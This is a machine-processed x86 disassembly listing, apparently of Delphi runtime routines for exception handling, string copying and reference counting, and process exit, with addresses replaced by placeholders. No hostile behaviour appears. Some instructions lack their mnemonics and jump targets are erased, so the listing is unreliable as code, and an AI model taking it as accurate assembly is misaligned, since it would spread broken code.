je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402bd0
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_403960
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_403648
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_403998
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403f50
sub_4039c0
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_405cc8
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_403224
call sub_4035a8
sub_403a14
call sub_405cc8
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_403224
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_403670
jmp edx
sub_403a5c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4027c0
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403bbc
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403be4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403c2a
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403c44
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403c8a
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403ce4
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405a5c
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d08
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405a5c
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d30
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d54
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403db0
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403de0
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_40122c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_4011f4
push eax
call sub_401214
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_4011f4
push eax
call sub_401214
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403e6c
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403d54
call sub_403de0
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403be4
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403bbc
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_405528
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403db0
push eax
call sub_401244
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_403f5c
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_4026dc
pop eax
sub_403f80
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026dc
sub_403fb0
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_404020
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028b8
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026dc
sub_403ff4
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026dc
sub_404020
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4026bc
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_40404c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_404020
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_403f5c
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028b8
sub_40407c
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_40409c
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x4
sub_4040b8
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_403f5c
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_4045a8
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_40407c
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_40407c
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4045a8
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_40404c
jmp r-xdata
sub_404154
xor ecx ecx
test edx edx
je r-xdata
jmp sub_40404c
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_404184
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4040b8
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4041cc
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_40404c
not ecx
sub_4041f8
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028b8
pop ebx
retn
mov ecx ebx
sub_404224
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_403fb0
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_4045a8
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_4045a8
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028b8
pop edi
pop esi
pop ebx
retn
sub_404268
test edx edx
je r-xdata
mov edx ecx
jmp sub_403fb0
test ecx ecx
je sub_403fb0
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_404224
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_404020
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028b8
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028b8
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_403fb0
pop edx
pop eax
jmp sub_404224
call sub_403fb0
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_4042dc
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_404020
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_4045a8
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028b8
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_403fb0
dec [ edx - 0x8 ]
sub_404368
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_404428
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_404020
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028b8
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_4026dc
sub_40447c
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_403f5c
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_40404c
jmp r-xdata
pop ebx
retn 0x4
sub_4044bc
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_404428#2
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028b8
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_4045a8
mov edi ecx
sub_404504
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_4045a8
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4028b8
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028b8
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_404560
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_4045a8
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_403f5c
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_404020
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_4026fc
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028b8
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_404654
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_404678
test edx edx
je sub_40463c
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_40463c
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402818
retn
sub_40469c
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_40463c
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_404884
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_40409c
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_40409c
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404884
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404728
jmp r-xdata
sub_404728
test ecx ecx
je sub_40463c
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402818
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_40474c
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404728
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4047b4
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_404838
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_4047a8
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_404728
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_404884
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_40462c
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404614
mov ebx eax
mov eax [ edi ]
call sub_4047a8
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4028b8
mov eax esi
sub_4048c8
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_4048f8
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_4048f8
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_4048f8
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_4048c8
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402818
sub_40498c
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_4049d8
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_4049d8
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_403f80
jmp r-xdata
call sub_403f5c
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_404654
jmp r-xdata
call sub_40463c
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_4049c0
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_4049d8
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_40498c
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_405598
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_404eec
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402818
sub_404ae8
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028b8
mov edx [ eax + esi ]
add eax ebx
call sub_403fb0
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_404678
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404ad0
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4028b8
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404c04
pop eax
jmp r-xdata
cmp cl 0xe
